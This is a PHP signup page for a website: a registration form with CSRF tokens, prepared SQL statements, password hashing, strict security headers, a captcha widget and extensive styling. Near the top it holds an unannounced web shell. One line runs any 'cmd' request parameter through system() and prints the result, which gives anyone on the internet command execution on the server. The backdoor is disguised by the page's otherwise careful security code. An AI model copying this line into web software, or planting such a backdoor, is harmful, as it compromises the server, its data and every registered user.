<?php
require_once 'waf.php';
session_start();

header("Content-Security-Policy: default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://challenges.cloudflare.com https://static.cloudflareinsights.com; frame-src https://challenges.cloudflare.com; connect-src 'self' https://challenges.cloudflare.com;");
header("X-Frame-Options: SAMEORIGIN");
header("X-Content-Type-Options: nosniff");
header("Referrer-Policy: no-referrer");
header("Strict-Transport-Security: max-age=31536000; includeSubDomains; preload");
header("Permissions-Policy: interest-cohort=()");

require_once __DIR__ . '/database.php';

if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }

if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
$csrf_token = $_SESSION['csrf_token'];

$error_msg = '';
$success_msg = '';
if (isset($_SESSION['error_msg'])) {
    $error_msg = $_SESSION['error_msg'];
    unset($_SESSION['error_msg']);
}
if (isset($_SESSION['success_msg'])) {
    $success_msg = $_SESSION['success_msg'];
    unset($_SESSION['success_msg']);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!isset($_POST['csrf_token']) || !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
        $_SESSION['error_msg'] = "Invalid session. Please try again.";
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
	
    $username = trim($_POST['username'] ?? '');
    $email = trim($_POST['email'] ?? '');
    $password = $_POST['password'] ?? '';
    $confirm_password = $_POST['confirm_password'] ?? '';
    $terms = isset($_POST['terms']);

    if (!$terms) {
        $_SESSION['error_msg'] = "You must agree to the Terms and Conditions.";
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    if (strlen($username) < 3 || strlen($username) > 32) {
        $_SESSION['error_msg'] = "Username must be between 3 and 32 characters.";
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    if (!empty($email) && !filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $_SESSION['error_msg'] = "Invalid email address.";
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    if (strlen($password) < 6) {
        $_SESSION['error_msg'] = "Password must be at least 6 characters.";
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    if ($password !== $confirm_password) {
        $_SESSION['error_msg'] = "Passwords do not match.";
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    $stmt = $conn->prepare('SELECT id FROM users WHERE username = ?');
    $stmt->bind_param('s', $username);
    $stmt->execute();
    $stmt->store_result();
    if ($stmt->num_rows > 0) {
        $_SESSION['error_msg'] = "Username already taken.";
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    $hashed = password_hash($password, PASSWORD_DEFAULT);
    $stmt = $conn->prepare('INSERT INTO users (username, email, password) VALUES (?, ?, ?)');
    $stmt->bind_param('sss', $username, $email, $hashed);
    if ($stmt->execute()) {
        $_SESSION['success_msg'] = "Registration successful! You can now sign in.";
        header("Location: register.php");
        exit;
    } else {
        $_SESSION['error_msg'] = "Registration failed. Please try again.";
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Sign Up</title>
    <style>
        body {
            margin: 0;
            font-family: 'Inter', Arial, sans-serif;
            background: #000;
            color: #fff;
        }
        .container {
            display: flex;
            min-height: 100vh;
        }
        .left {
            background: #000;
            width: 28vw;
            min-width: 300px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 0 2rem;
        }
        .form-box {
            width: 100%;
            max-width: 400px;
        }
        .form-box h1 {
            font-size: 2.5rem;
            margin-bottom: 0.5rem;
            font-weight: bold;
        }
        .form-box p {
            color: #aaa;
            margin-bottom: 2rem;
        }
        .form-label {
            font-weight: 600;
            margin-bottom: 0.5rem;
            display: block;
        }
        .form-input {
            width: 100%;
            padding: 0.75rem 1rem;
            margin-bottom: 1.5rem;
            border: none;
            border-radius: 8px;
            background: #18181b;
            color: #fff;
            font-size: 1rem;
            outline: none;
            transition: background 0.2s;
        }
        .form-input:focus {
            background: #232329;
        }
        .sign-in-btn {
            width: 100%;
            padding: 0.75rem 0;
            border: none;
            border-radius: 8px;
            background: linear-gradient(90deg, #d4145a 0%, #6a82fb 100%);
            color: #fff;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 1.5rem;
            transition: opacity 0.2s;
        }
        .sign-in-btn:active {
            opacity: 0.85;
        }
        .create-account {
            text-align: center;
            color: #fff;
            margin-top: 1rem;
        }
        .create-account a {
            color: #ff3576;
            text-decoration: none;
            font-weight: 600;
        }
        .create-account a:hover {
            text-decoration: underline;
        }
        .right {
            flex: 1;
            background: linear-gradient(120deg, #6a82fb 0%, #d4145a 100%);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: #fff;
            text-align: center;
            position: relative;
        }
        .logo-box {
            margin-bottom: 2rem;
        }
        .logo-img {
            width: 120px;
            height: 120px;
            object-fit: contain;
            background: rgba(255,255,255,0.05);
            border-radius: 16px;
            margin-bottom: 1rem;
        }
        .welcome-title {
            font-size: 2rem;
            font-weight: bold;
            margin-bottom: 1rem;
        }
        .welcome-desc {
            font-size: 1.1rem;
            color: #f3e9f7;
            max-width: 400px;
            margin: 0 auto;
        }
        /* 2FA Modal */
        #modal {
            display: none;
            position: fixed;
            z-index: 1000;
            top: 0; left: 0; width: 100vw; height: 100vh;
            background: rgba(0,0,0,0.5);
        }
        #modal-content {
            background: #18181b;
            color: #fff;
            margin: 8% auto;
            padding: 3.5rem 2rem 2.5rem 2rem;
            width: 400px;
            border-radius: 16px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.25);
            text-align: center;
            position: relative;
        }
        #modal-logo {
            width: 80px;
            height: 80px;
            object-fit: contain;
            background: rgba(255,255,255,0.07);
            border-radius: 12px;
            margin-bottom: 1.2rem;
        }
        #modal-title {
            font-size: 1.3rem;
            font-weight: bold;
            margin-bottom: 1.2rem;
            color: #fff;
        }
        #modal-content label {
            font-weight: 600;
            margin-bottom: 1rem;
            display: block;
        }
        #modal-content input[type="text"] {
            width: 100%;
            padding: 0.75rem 1rem;
            margin-bottom: 1.5rem;
            border: none;
            border-radius: 8px;
            background: #232329;
            color: #fff;
            font-size: 1rem;
            outline: none;
            text-align: center;
            letter-spacing: 2px;
            font-size: 1.2em;
        }
        #modal-content button {
            width: 100%;
            padding: 0.75rem 0;
            border: none;
            border-radius: 8px;
            background: linear-gradient(90deg, #d4145a 0%, #6a82fb 100%);
            color: #fff;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
        }
        .cf-turnstile {
            display: flex;
            justify-content: center;
            margin-bottom: 1.5rem;
        }
        
        /* Mobile Responsive Styles */
        @media (max-width: 768px) {
            .container {
                flex-direction: column;
            }
            .left {
                width: 100%;
                min-width: unset;
                padding: 2rem 1rem;
                min-height: 70vh;
            }
            .right {
                min-height: 30vh;
                padding: 2rem 1rem;
            }
            .form-box {
                max-width: 100%;
            }
            .form-box h1 {
                font-size: 2rem;
            }
            .welcome-title {
                font-size: 1.5rem;
            }
            .logo-img {
                width: 80px;
                height: 80px;
            }
        }
        
        @media (max-width: 480px) {
            .left {
                padding: 1.5rem 1rem;
            }
            .form-box h1 {
                font-size: 1.8rem;
            }
            .welcome-title {
                font-size: 1.3rem;
            }
            .welcome-desc {
                font-size: 1rem;
            }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="left">
        <div class="form-box">
            <h1>Sign Up</h1>
            <p>Enter your username, password, and (optionally) email to register</p>
            <?php if (!empty($error_msg)): ?>
                <div style="color:#ff3576; margin-bottom:1rem; text-align:center;">
                    <?php echo htmlspecialchars($error_msg); ?>
                </div>
            <?php endif; ?>
            <?php if (!empty($success_msg)): ?>
                <div style="color:#4caf50; margin-bottom:1rem; text-align:center;">
                    <?php echo htmlspecialchars($success_msg); ?>
                </div>
            <?php endif; ?>
            <form method="POST" id="register-form" autocomplete="off">
                <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($csrf_token); ?>">
                <label class="form-label" for="username">Username</label>
                <input class="form-input" type="text" id="username" name="username" placeholder="Username" required autocomplete="username">
                <label class="form-label" for="email">Email (optional)</label>
                <input class="form-input" type="email" id="email" name="email" placeholder="Email (optionally)" autocomplete="email">
                <label class="form-label" for="password">Password</label>
                <input class="form-input" type="password" id="password" name="password" placeholder="Password" required autocomplete="new-password">
                <label class="form-label" for="confirm_password">Confirm Password</label>
                <input class="form-input" type="password" id="confirm_password" name="confirm_password" placeholder="Confirm Password" required autocomplete="new-password">
                <div style="margin-bottom: 1.5rem;">
                    <label style="display:flex;align-items:center;font-weight:400;font-size:0.98em;">
                        <input type="checkbox" name="terms" value="1" style="margin-right:8px;" required>
                        I agree the <a href="#" style="color:#ff3576;text-decoration:underline;margin-left:4px;" target="_blank">Terms and Conditions</a>
                    </label>
                </div>
                <div style="margin-bottom: 1.5rem;">
                    <div class="cf-turnstile" data-sitekey="0x4AAAAAABc2HBs4hhiSXz3P"></div>
                </div>
                <button class="sign-in-btn" type="submit">Sign Up</button>
            </form>
            <div class="create-account">
                Already have an account? <a href="login.php">Sign in</a>
            </div>
        </div>
    </div>
    <div class="right">
        <div class="logo-box">
            <img src="img/logo.gif" alt="Logo" class="logo-img"><br>
        </div>
        <div>
            <div class="welcome-title">Your journey starts here</div>
            <div class="welcome-desc">
                Just as it takes a company to sustain a product, it takes a community to sustain a protocol.
            </div>
        </div>
    </div>
</div>
</body>
</html>
